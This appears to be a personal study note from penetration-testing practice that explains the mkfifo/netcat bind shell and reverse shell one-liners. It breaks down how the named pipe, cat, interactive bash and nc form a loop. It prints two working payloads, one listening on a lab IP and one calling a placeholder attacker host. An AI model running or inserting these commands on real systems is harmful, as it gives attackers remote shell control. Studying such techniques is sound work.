bind shell
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

instead of this bind shell example we can set an reverse shell using the same piped loop but change how the network comunication will work

reverse shell
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -nv <attacker_ip> 7777 > /tmp/f
```

the /tmp/f file:
	it just an a temporary, writable location. in this payload this file will just serve the purpose of creating an named pipe process (FIFO)
	this will be our switchboard to manage and run standand OS data streams

the command `mkfifo /tmp/f` creates a named pipe file
	[[mkfifo - what is a named pipe]]

the IPC loop: `cat /tmp/f | /bin/bash -i 2>&1 | nc -nv <attacker_ip> 7777 > /tmp/f`
	this IPC (inter-process comunnication) craft an loop interation of reading the written data of the /tmp/f

`cat /tmp/f |
	the cat interacts differently from expected files when it executes on an named pipe context: 
		the process doesn't find the EOF since its piped to other processes so it waits for data to be written and serve the output to the stdin of the bash session

`/bin/bash -i 2>&1 |`
the bash session serves the output to the network connection process stdin -> this will transfers the data so the user can view the error and outputs that comes from the bash shell.

`nc -nv <attacker_ip> 7777 > /tmp/f`
the nc writes what comes from the network connection and write into /tmp/f
since we have written data, 
the cat process that is waiting, now reads and send the output to the interactive bash shell until find the EOF.


